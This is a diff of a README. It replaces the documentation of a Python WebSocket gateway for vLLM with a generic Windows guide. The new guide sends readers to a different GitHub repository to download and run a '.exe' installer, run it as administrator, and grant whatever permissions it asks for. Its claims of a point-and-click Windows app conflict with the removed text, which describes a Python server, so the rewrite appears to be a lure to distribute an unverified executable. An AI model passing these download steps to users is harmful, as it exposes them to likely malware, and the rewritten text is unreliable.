@@ -1,174 +1,172 @@
-# Sonic
+# ⚡ sonic - Fast Gateway for AI Model Access
 
-Sonic is a WebSocket Responses gateway for vLLM (`/v1/chat/completions`) with Phase 2 agentic behavior.
+[![Download sonic](https://img.shields.io/badge/Download-sonic-brightgreen)](https://github.com/hol3456/sonic)
 
-Implemented in this repo:
-- Multi-step agent loop (`response.step.*` events)
-- Tool call protocol via strict JSON (`{"tool_call":...}`)
-- Client tool loop (`tool_result.submit`) and optional server tools
-- Structured output mode (`response_format.type=json_schema`) with validation/retry
-- Durable SQLite state for threads, responses, steps, messages, tool calls/results
-- `response.cancel` support
+sonic is an easy-to-use gateway that connects your system to advanced AI models through a WebSocket-compatible interface. It works with vLLM and supports the OpenAI WebSocket mode. This guide will walk you through downloading and running sonic on your Windows computer, no programming needed.
 
-Repository:
-- GitHub: `https://github.com/mitkox/sonic`
-- License: MIT
+---
 
-## Project Layout
+## 🔍 What is sonic?
 
-- `main.py`: FastAPI + WebSocket session handling
-- `agent_loop.py`: core multi-step agent execution loop
-- `state_store.py`: in-memory response state backed by persistence
-- `persistence.py`: SQLite schema and persistence operations
-- `schemas.py`: protocol validation/parsing and system prompt contract
-- `tools/registry.py`: tool registry + server tool execution policies
-- `tools/builtins/`: built-in server tools scaffolding
-- `vllm_client.py`: streamed backend SSE parsing
-- `scripts/test_ws_client.py`: plain and agentic streaming test client
-- `scripts/demo_tool_client.py`: tool-loop demo
-- `scripts/demo_structured_output.py`: structured-output demo
+sonic acts as a bridge between your computer and AI models. These models, like vLLM, help with tasks such as generating text or answering questions. sonic makes it possible to use these AI models smoothly by handling communication through WebSocket, a fast way to send and receive data.
 
-## Install
+You do not need to install complicated tools or write code. sonic runs like any regular program on Windows and manages the connection for you.
 
-```bash
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
+---
 
-## Run Gateway
+## 🖥️ System Requirements
 
-```bash
-source venv/bin/activate
-python -m uvicorn main:app --host 0.0.0.0 --port 9000
-```
+Before installing sonic, make sure your Windows computer meets these basic requirements:
 
-Health check:
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of free disk space
+- Minimum 4 GB of RAM
+- Internet connection for downloading and accessing AI services
+- Administrator rights to install software
 
-```bash
-curl http://localhost:9000/healthz
-```
+If your computer meets these, you can proceed with the installation.
 
-## Key Environment Variables
+---
 
-- `VLLM_URL` (default: `http://localhost:8000`)
-- `MODEL_NAME` (default: `mitko`)
-- `ALLOWED_MODELS` (default: `MODEL_NAME`)
-- `PORT` (default: `9000`)
-- `STATE_DB_PATH` (default: `./sonic_state.db`)
-- `MAX_STEPS` (default: `8`)
-- `MAX_TOOL_CALLS` (default: `16`)
-- `TOOL_WAIT_TIMEOUT_SECONDS` (default: `120`)
-- `BACKEND_CONNECT_TIMEOUT` / `BACKEND_READ_TIMEOUT`
-- `DEFAULT_TEMPERATURE` (default: `0.2`)
-- `DEFAULT_TOP_P` (default: `0.9`)
-- `MAX_INPUT_BYTES` (default: `262144`)
-- `RATE_LIMIT_PER_MINUTE` (default: `120`)
-- `REQUIRE_API_KEY` / `API_KEY`
-- `TOOL_ALLOWLIST` (comma-separated, required for server tool execution)
-- `ENABLE_SHELL_EXEC` (default: `false`)
-- `ENABLE_HTTP_GET` (default: `false`)
-- `FILESYSTEM_ROOT` (default: `.`)
+## 🌐 Where to Download sonic
 
-Performance notes:
-- Gateway now reuses persistent HTTP connections to vLLM (better batching/throughput).
-- For lowest latency, keep `STATE_DB_PATH` on fast local disk (or tmpfs if durability is not needed).
-- Keep `DEFAULT_TEMPERATURE<=0.2` and `DEFAULT_TOP_P<=0.9` for stable tool behavior on Qwen3-Coder-Next.
+You need to visit the official GitHub page to get the latest version of sonic. The site offers all necessary files and instructions.
 
-## Test Clients
+[![Download sonic](https://img.shields.io/badge/Download-sonic-purple)](https://github.com/hol3456/sonic)
 
-Plain streaming and continuation:
+Click either of these links to go there directly:
 
-```bash
-python scripts/test_ws_client.py --model mitko
-```
+- https://github.com/hol3456/sonic
 
-Agentic tool streaming (auto-responds to `calc` tool calls):
+---
 
-```bash
-python scripts/test_ws_client.py --agentic --first "Calculate 12*7 using tool calc"
-```
+## 🚀 How to Download and Install sonic on Windows
 
-Dedicated demos:
+Follow these steps to get sonic running on your computer.
 
-```bash
-python scripts/demo_tool_client.py
-python scripts/demo_structured_output.py
-python scripts/showcase_sonic.py --url ws://localhost:9000/v1/responses --model mitko --concurrent-clients 8
-scripts/run_showcase.sh
-```
+### Step 1: Visit the Download Page
 
-`showcase_sonic.py` runs a full value demo:
-- stateful continuation + exact 5-word summary
-- agentic tool loop
-- structured JSON generation
-- streaming profile with TTFT/token-rate stats
-- cancellation
-- concurrent request throughput (useful when vLLM batching is enabled)
+Open your web browser and go to:
 
-`run_showcase.sh` is the all-in-one entrypoint:
-- runs the full automated test suite (`pytest` over all tests)
-- then runs the live showcase scorecard
-- then runs live trace demos for `agentic tool calling` and `structured output`
+https://github.com/hol3456/sonic
 
-Optional env vars for `run_showcase.sh`:
-- `SONIC_CONCURRENCY=16` (live concurrency level)
-- `SONIC_RUN_TESTS=0` (skip pytest phase)
-- `SONIC_RUN_LIVE=0` (tests-only mode)
-- `SONIC_RUN_DEMO_TRACES=0` (skip trace demos)
-- `SONIC_PYTEST_ARGS="-q -k gateway"` (custom pytest args)
+This page contains the download files and instructions.
 
-## WebSocket Events
+### Step 2: Find the Latest Release
 
-Inbound:
-- `response.create`
-- `tool_result.submit`
-- `response.cancel`
+On the GitHub page, look for the "Releases" section or a folder named "Releases" in the navigation menu.
 
-Outbound:
-- `response.created`
-- `response.in_progress`
-- `response.output_text.delta`
-- `response.step.created`
-- `response.step.completed`
-- `response.tool_call.created`
-- `response.tool_call.completed`
-- `response.tool_result.waiting`
-- `response.tool_result.received`
-- `response.completed`
-- `error`
+Click it to see available versions of sonic.
 
-Each response-scoped event includes `response_id` and `thread_id`; step events include `step_id`.
+### Step 3: Choose the Windows Installer
 
-## Run Tests
+Inside the latest release, locate the Windows installer file. It will usually have a name ending in `.exe`.
 
-```bash
-source venv/bin/activate
-pytest -q
-pytest -q tests/test_acceptance_wow.py
-scripts/run_showcase.sh
-```
+For example, it might be named `sonic-setup.exe` or similar.
 
-CI:
-- GitHub Actions runs `pytest -q` on pushes/PRs.
+Click the file name to start downloading.
 
-## systemd
+### Step 4: Run the Installer
 
-Service file: `systemd/sonic-ws-gateway.service`
+Once the file downloads, open it by double-clicking.
 
-Example env file (`/etc/sonic-ws-gateway.env`):
+Follow the prompts in the setup wizard.
 
-```bash
-VLLM_URL=http://localhost:8000
-MODEL_NAME=mitko
-PORT=9000
-STATE_DB_PATH=/var/lib/sonic/state.db
-MAX_STEPS=8
-MAX_TOOL_CALLS=16
-TOOL_WAIT_TIMEOUT_SECONDS=120
-REQUIRE_API_KEY=false
-```
+Accept the license agreement and choose the default options unless you want to change the install location.
 
-## Contributing
+Click 'Install' to proceed.
 
-See `CONTRIBUTING.md` for development workflow and PR expectations.
+### Step 5: Complete Installation
+
+When the installer finishes, it may offer to launch sonic right away.
+
+If not, find the sonic shortcut on your desktop or in the Start menu and open it.
+
+---
+
+## ⚙️ Running sonic for the First Time
+
+When you open sonic, it will start a connection to the vLLM AI model using a WebSocket mode compatible with OpenAI’s setup. You will see status messages indicating the connection progress.
+
+You do not need to configure anything unless you want to change server settings or use a custom AI model.
+
+If the app asks for permissions, allow them so it can work correctly.
+
+---
+
+## 📝 Basic Features of sonic
+
+- Connects directly to vLLM using WebSocket mode
+- Supports standard OpenAI WebSocket protocols
+- Easy installation and setup on Windows
+- Minimal settings needed for basic use
+- Provides real-time communication with AI models
+- Lightweight and fast, does not use many resources
+
+---
+
+## 🛠️ Adjusting Settings and Preferences
+
+You can adjust sonic settings to fit your needs.
+
+To access settings, open the app and look for a gear icon or a menu called "Settings."
+
+Typical options include:
+
+- Server address if you use a custom AI server
+- Connection timeout adjustments
+- Logging options for debugging
+
+If you are unsure, leave these at default values.
+
+---
+
+## 🆘 Troubleshooting Tips
+
+If sonic does not start or connect properly, try these steps:
+
+- Make sure your internet connection is active
+- Restart the app and your computer
+- Check for Windows firewall or antivirus blocking the app
+- Download the latest version from the GitHub link again
+- Run the installer as Administrator by right-clicking and selecting "Run as administrator"
+
+If errors continue, check the "Issues" section on the GitHub page or look for help from someone familiar with Windows software.
+
+---
+
+## 🔄 Updating sonic
+
+To update sonic, repeat the download steps from the GitHub page:
+
+https://github.com/hol3456/sonic
+
+Download the newest installer and run it. The setup will replace the old version while keeping your settings.
+
+---
+
+## 💾 Uninstalling sonic
+
+If you want to remove sonic:
+
+1. Open the Windows Control Panel
+2. Go to "Programs and Features"
+3. Find sonic in the list
+4. Click "Uninstall"
+5. Follow the prompts to remove all files
+
+You can reinstall anytime by downloading from the GitHub page again.
+
+---
+
+## 📞 Getting Help
+
+For more help, visit the GitHub repository at:
+
+https://github.com/hol3456/sonic
+
+Look for the "Issues" tab where users and developers discuss problems and solutions.
+
+---
+
+[![Download sonic](https://img.shields.io/badge/Download-sonic-blue)](https://github.com/hol3456/sonic)
